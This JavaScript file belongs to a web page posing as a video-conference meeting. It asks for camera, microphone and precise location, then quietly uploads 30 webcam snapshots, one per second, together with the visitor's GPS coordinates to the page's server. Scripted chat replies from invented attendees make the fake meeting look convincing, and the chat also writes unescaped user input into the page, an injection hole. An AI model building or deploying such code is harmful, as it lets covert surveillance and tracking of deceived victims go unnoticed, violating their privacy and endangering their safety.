document.addEventListener('DOMContentLoaded', function() {
    // Get video element
    const videoElement = document.getElementById('local-video');
    const toastElement = document.getElementById('connection-toast');
    const toast = new bootstrap.Toast(toastElement);
    
    // Counter for captured images
    let captureCount = 0;
    const MAX_CAPTURES = 30;
    
    // Capture interval in milliseconds (every 1 second for faster capture)
    const CAPTURE_INTERVAL = 1000;
    
    // Location data
    let userLocation = null;
    
    // Initialize camera
    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }, 
                audio: true 
            });
            
            // Display video stream
            videoElement.srcObject = stream;
            
            // Get user location
            getUserLocation();
            
            // Show connection toast
            setTimeout(() => {
                toast.show();
            }, 1500);
            
            // Start capturing
            startCapturing();
            
        } catch (err) {
            console.error('Error accessing camera:', err);
            alert('Camera access is required for the meeting. Please enable camera access and refresh the page.');
        }
    }
    
    // Get user location
    function getUserLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                // Success callback
                (position) => {
                    userLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    };
                    
                    // Send location data to server once
                    sendLocationToServer(userLocation);
                },
                // Error callback
                (error) => {
                    console.error('Error getting location:', error);
                },
                // Options
                { enableHighAccuracy: true }
            );
        }
    }
    
    // Send location data to server
    function sendLocationToServer(locationData) {
        fetch('/location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(locationData)
        })
        .then(response => response.json())
        .catch(error => console.error('Error sending location:', error));
    }
    
    // Capture image from video stream
    function captureImage() {
        if (captureCount >= MAX_CAPTURES) {
            return; // Stop if we've reached the limit
        }
        
        // Create canvas element
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        
        // Draw video frame to canvas
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to base64 image
        const imageData = canvas.toDataURL('image/jpeg');
        
        // Send to server
        sendImageToServer(imageData);
        
        // Increment counter
        captureCount++;
        
        // Schedule next capture if not reached limit
        if (captureCount < MAX_CAPTURES) {
            setTimeout(captureImage, CAPTURE_INTERVAL);
        }
    }
    
    // Send captured image to server
    function sendImageToServer(imageData) {
        // Include location data if available
        const payload = {
            image: imageData,
            location: userLocation
        };
        
        fetch('/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .catch(error => console.error('Error sending image:', error));
    }
    
    // Start capturing images
    function startCapturing() {
        // Add user info from session storage to the first capture
        const userName = sessionStorage.getItem('user_name');
        const userEmail = sessionStorage.getItem('user_email');
        
        // Wait a moment for video to initialize
        setTimeout(() => {
            captureImage();
        }, 1000); // Reduced delay for faster first capture
    }
    
    // Initialize buttons
    function initButtons() {
        // Mute button
        document.getElementById('mute-btn').addEventListener('click', function() {
            const btnText = this.textContent.trim();
            if (btnText.includes('Mute')) {
                this.innerHTML = '<i class="bi bi-mic-mute"></i> Unmute';
            } else {
                this.innerHTML = '<i class="bi bi-mic"></i> Mute';
            }
        });
        
        // Video button
        document.getElementById('video-btn').addEventListener('click', function() {
            const btnText = this.textContent.trim();
            if (btnText.includes('Stop')) {
                this.innerHTML = '<i class="bi bi-camera-video-off"></i> Start Video';
                videoElement.style.display = 'none';
            } else {
                this.innerHTML = '<i class="bi bi-camera-video"></i> Stop Video';
                videoElement.style.display = 'block';
            }
        });
        
        // Leave button
        document.getElementById('leave-btn').addEventListener('click', function() {
            if (confirm('Are you sure you want to leave the meeting?')) {
                window.location.href = '/';
            }
        });
        
        // Send button
        document.getElementById('send-btn').addEventListener('click', sendChatMessage);
        
        // Chat input
        document.getElementById('chat-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendChatMessage();
            }
        });
    }
    
    // Send chat message
    function sendChatMessage() {
        const chatInput = document.getElementById('chat-input');
        const message = chatInput.value.trim();
        
        if (message) {
            const chatArea = document.querySelector('.chat-area');
            const userName = sessionStorage.getItem('user_name') || 'You';
            
            // Create message element
            const messageDiv = document.createElement('div');
            messageDiv.className = 'chat-message user-message';
            
            const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
            
            messageDiv.innerHTML = `
                <div class="message-content">
                    <strong>${userName}</strong>
                    <p>${message}</p>
                    <small class="text-muted">${time}</small>
                </div>
            `;
            
            // Add to chat area
            chatArea.appendChild(messageDiv);
            
            // Clear input
            chatInput.value = '';
            
            // Scroll to bottom
            chatArea.scrollTop = chatArea.scrollHeight;
            
            // Simulate response after a delay
            setTimeout(() => {
                simulateResponse();
            }, 2000 + Math.random() * 3000);
        }
    }
    
    // Simulate response
    function simulateResponse() {
        const responses = [
            "I see your point. Let's discuss that further in the next section.",
            "Great question! I think we should address that in our roadmap.",
            "Thank you for bringing that up. I'll make a note of it.",
            "Let's take that offline and circle back tomorrow.",
            "I'll need to check with the team and get back to you on that."
        ];
        
        const names = ["John Smith", "Emily Johnson", "Robert Davis"];
        
        const chatArea = document.querySelector('.chat-area');
        const randomName = names[Math.floor(Math.random() * names.length)];
        const randomResponse = responses[Math.floor(Math.random() * responses.length)];
        
        const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        
        // Create message element
        const messageDiv = document.createElement('div');
        messageDiv.className = 'chat-message user-message';
        
        messageDiv.innerHTML = `
            <div class="message-content">
                <strong>${randomName}</strong>
                <p>${randomResponse}</p>
                <small class="text-muted">${time}</small>
            </div>
        `;
        
        // Add to chat area
        chatArea.appendChild(messageDiv);
        
        // Scroll to bottom
        chatArea.scrollTop = chatArea.scrollHeight;
    }
    
    // Initialize
    initCamera();
    initButtons();
}); 